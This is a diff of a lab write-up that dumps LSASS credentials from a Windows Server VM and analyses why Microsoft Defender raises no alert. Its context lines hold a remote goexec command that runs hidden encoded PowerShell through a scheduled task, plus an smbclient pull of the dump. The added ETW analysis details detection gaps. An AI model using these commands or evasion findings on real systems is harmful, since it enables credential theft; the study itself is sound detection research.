@@ -48,7 +48,7 @@ A base64-encoded PowerShell payload was delivered via `goexec` using the Task Sc
 # [Kali]
 ./goexec tsch create 192.168.1.52 \
   -u 'ubuntu' \
-  -p 'xxx****' \
+  -p 'j44****' \
   --task '\systemshell' \
   --exec 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' \
   --args "-NoP -NonI -W Hidden -Enc $ENCODED"
@@ -60,7 +60,7 @@ The task was configured to self-delete after execution. Dump completed in approx
 
 ```bash
 # [Kali]
-smbclient //192.168.1.52/C$ -U 'ubuntu%xxx****' \
+smbclient //192.168.1.52/C$ -U 'ubuntu%j44****' \
   -c 'get Windows\Temp\out2.dmp /tmp/out290425_SERVER_2025PATCHED_UBR_1742.dmp'
 ```
 
@@ -184,6 +184,91 @@ Event IDs **1116** (threat detected), **1117** (action taken), **1006/1007** (sc
 EID 3002 fired at **10:00:58 AM** — the exact minute the dump completed writing. The RTP filter driver briefly entered pass-through mode, meaning on-access scanning was suspended. This condition was not intentionally introduced and is attributed to earlier service disruption in the lab environment. It is worth noting regardless: even if Defender held a behavioural signature for `MiniDumpWriteDump` activity, the RTP engine was momentarily blind at the precise moment the dump file reached its final size. A clean run with uninterrupted RTP is required to fully validate detection coverage.
 
 **Conclusion: No Defender detections were observed for this technique under the tested conditions (signature 1.449.353.0, Server 2025 UBR 1742) — even when RTP was active during most of the execution window.**
+
+---
+
+## ETW Engine Trace Analysis
+
+To gain visibility into Defender's internal behaviour during the dump write, the `Microsoft-Antimalware-Engine` ETW provider was captured across the execution window.
+
+```powershell
+# [Victim VM — PowerShell as Admin]
+logman start DefenderTrace `
+  -p "Microsoft-Antimalware-Engine" `
+  -o C:\Windows\Temp\defendertrace.etl `
+  -ets
+
+# ... run dump ...
+
+logman stop DefenderTrace -ets
+
+tracerpt C:\Windows\Temp\defendertrace.etl `
+  -o C:\Windows\Temp\defendertrace.xml `
+  -of XML
+```
+
+### Key findings
+
+**1. Behavioural classification — threat named, no action taken**
+
+Buried in the trace, a single entry:
+
+```xml
+<Data Name="VName">Behavior:Win32/LsassDump.AK</Data>
+```
+
+Defender's behavioural engine internally classified the dump activity as `Behavior:Win32/LsassDump.AK` — a named detection. This never produced an EID 1116 or 1117 in the operational log. The engine observed the behaviour, assigned it a threat name, and produced no external signal. No remediation. No alert. No operational event.
+
+This is the most significant finding of this session. It is not a detection gap in the conventional sense — Defender did not miss the activity. It observed it, classified it, and chose (or failed) to act. The gap is between internal classification and external telemetry emission.
+
+**2. Continuous AMSI memory stream scanning during write**
+
+The trace shows sustained AMSI stream scan requests against memory regions throughout the dump write window:
+
+```xml
+<Data Name="Path">MemScanVfz-AMSI-865F9243-FA9B-220B-CFC4-1240285F9144</Data>
+<Task>Stream scan request</Task>
+<Message>Start of stream scan request</Message>
+<Data Name="FirstParam">AmsiScan</Data>
+...
+<Message>End of stream scan request</Message>
+```
+
+These repeat continuously — dozens of scan start/end pairs across multiple AMSI GUIDs. This is the mechanism behind the extended write time observed in Vector 7 (30–45 minutes). Defender is intercepting memory chunks as `MiniDumpWriteDump` streams them to disk and submitting each for inspection. The write completes, but at heavily degraded throughput.
+
+**3. ScanResult values**
+
+| ScanResult | Meaning | Context |
+|---|---|---|
+| `2` | Clean / no threat | AMSI stream scans throughout write |
+| `5` | Threat found, action deferred | Engine scan requests (ScanSource 34) |
+
+`ScanResult=5` on engine scans (source 34) is consistent with the `Behavior:Win32/LsassDump.AK` classification — threat identified, no blocking action taken.
+
+**4. `reason=max_scan` — inspection budget exhausted**
+
+```xml
+<Data Name="FirstParam">sigseq=0x85b351bc4771;level=M;reason=max_scan;scancnt=2</Data>
+<Data Name="FirstParam">sigseq=0x85b351bc4771;level=1;reason=max_scan;scancnt=1</Data>
+```
+
+Defender hit its per-scan-cycle limit on some memory regions and stopped inspecting further chunks. The dump file size (53 MB) exceeded the engine's inspection budget for continuous streaming scans. This is a second contributing factor to the detection gap — beyond the classification-without-action problem, portions of the dump were not fully inspected due to scan count limits.
+
+**5. Recurring RTP pass-through (3002/3007) — environmental instability confirmed**
+
+A second 3002/3007 pair fired at **12:16–12:17 PM** — well after the dump completed and with no attack activity in progress. This confirms the RTP filter driver instability is a recurring VM resource issue, not correlated with dump activity. The 10:00 AM pass-through at dump completion was coincidental, not causal.
+
+### Interpretation
+
+The ETW trace resolves the question left open by the operational log. Defender was not simply unaware of the activity — it was actively engaged: scanning memory chunks via AMSI, running engine scans, and internally classifying the behaviour as `Behavior:Win32/LsassDump.AK`. The absence of operational log events (1116/1117) means the classification did not cross whatever internal threshold triggers remediation and telemetry emission.
+
+Three contributing factors to the silent outcome:
+
+1. **Classification without remediation** — `Behavior:Win32/LsassDump.AK` was named internally but never acted upon
+2. **Scan budget exhaustion** — `max_scan` indicates portions of the dump stream were not fully inspected
+3. **RTP pass-through at completion** — filter driver was momentarily blind at the precise moment the file reached final size
+
+None of these individually explain the outcome. Together they describe a behavioural enforcement layer that observed the activity, partially inspected it, classified it, and emitted no external signal. The full ETW trace is appended below as a raw artifact.
 
 ---
 
